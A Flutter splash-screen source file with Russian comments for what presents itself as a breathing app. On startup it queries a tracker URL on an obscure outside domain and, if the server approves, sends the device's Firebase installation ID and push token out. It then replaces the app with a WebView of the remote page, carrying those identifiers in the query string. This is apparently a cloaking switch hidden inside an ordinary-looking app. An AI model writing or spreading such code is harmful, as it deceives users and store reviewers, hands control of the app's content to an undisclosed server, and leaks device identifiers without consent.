import 'dart:async';
import 'package:breathe_app/constants/app_constants.dart';
import 'package:breathe_app/constants/image_source.dart';
import 'package:breathe_app/features/global/services/firebase_messaging_service.dart';
import 'package:breathe_app/features/global/services/local_notifications_service.dart';
import 'package:breathe_app/features/menu_screen/view/menu_screen.dart';
import 'package:breathe_app/features/splash_screen/data/repositories/tracking_repository.dart';
import 'package:breathe_app/features/splash_screen/view/web_view_screen.dart';
import 'package:breathe_app/theme/app_colors.dart';
import 'package:firebase_app_installations/firebase_app_installations.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:package_info_plus/package_info_plus.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static const String trackerToken = "Fh6pP6";
  static const String trackerBaseUrl = "https://dhgfgff.com/";

  final firebaseMessagingService = FirebaseMessagingService.instance();
  late final TrackingRepository _trackingRepository;

  @override
  void initState() {
    super.initState();

    _trackingRepository = TrackingRepository();

    // Запускаем инициализацию после первого кадра, чтобы UI успел построиться
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _startInitialization();
    });
  }

  Future<void> _startInitialization() async {
    try {
      // Шаг 1: Отобразить сплэш, а пуши и трекинг грузить в фоне
      await _initPushNotifications();

      // Шаг 2: Выполнить трекинг только после инициализации пушей
      await _handleTracking();
    } catch (e, st) {
      debugPrint("Ошибка при инициализации: $e\n$st");
      _goToMenu();
    }
  }

  /// Безопасная инициализация FCM
  Future<void> _initPushNotifications() async {
    try {
      await firebaseMessagingService.init(
        localNotificationsService: LocalNotificationsService.instance(),
      );
    } catch (e) {
      debugPrint("Ошибка инициализации FCM: $e");
    }
  }

  /// Отправка данных трекинга
  Future<void> _handleTracking() async {
    final fullTrackerLink = "$trackerBaseUrl$trackerToken";

    bool isValid = false;
    try {
      isValid = await _trackingRepository.isTrackerLinkValid(fullTrackerLink);
    } catch (e) {
      debugPrint("Ошибка проверки трекера: $e");
    }

    if (!isValid) {
      _goToMenu();
      return;
    }

    final trackingData = await _collectTrackingData();
    final filledLink = _buildTrackingUrl(fullTrackerLink, trackingData);

    try {
      final hasSent = await _trackingRepository.hasSentData();
      if (!hasSent) {
        final success = await _trackingRepository.sendTrackingData(
          trackingData,
        );
        if (success) {
          await _trackingRepository.markDataSent();
        }
      }
    } catch (e) {
      debugPrint("Ошибка отправки трекинга: $e");
    }

    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => WebViewScreen(url: filledLink)),
    );
  }

  Future<Map<String, String>> _collectTrackingData() async {
    String installationId = "";
    String fcmToken = "";
    String appName = "";

    try {
      installationId = await FirebaseInstallations.instance.getId();
    } catch (e) {
      debugPrint("Ошибка получения installationId: $e");
    }

    try {
      fcmToken = await FirebaseMessaging.instance.getToken() ?? '';
    } catch (e) {
      debugPrint("Ошибка получения FCM токена: $e");
    }

    try {
      final packageInfo = await PackageInfo.fromPlatform();
      appName = packageInfo.appName;
    } catch (e) {
      debugPrint("Ошибка получения packageInfo: $e");
    }

    return {
      "analyticsId": installationId,
      "notificationToken": fcmToken,
      "appName": appName,
      "trackerToken": trackerToken,
    };
  }

  String _buildTrackingUrl(String baseUrl, Map<String, String> params) {
    final uri = Uri.parse(baseUrl).replace(
      queryParameters: {
        "aid": params["analyticsId"] ?? '',
        "cmid": params["notificationToken"] ?? '',
      },
    );
    return uri.toString();
  }

  void _goToMenu() {
    if (!mounted) return;
    Navigator.of(
      context,
    ).pushReplacement(MaterialPageRoute(builder: (_) => const MenuScreen()));
  }

  @override
  Widget build(BuildContext context) {
    final textStyle = const TextStyle(
      fontFamily: 'SfPro',
      fontSize: 36,
      fontWeight: FontWeight.w600,
      color: Colors.white,
    );

    return Scaffold(
      body: SafeArea(
        child: Container(
          decoration: BoxDecoration(gradient: AppColors.blueWhiteGradient),
          child: Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                SvgPicture.asset(
                  ImageSource.logo,
                  width: MediaQuery.of(context).size.width * 0.8,
                ),
                const SizedBox(height: 16),
                Text(AppConstants.nameApp, style: textStyle),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
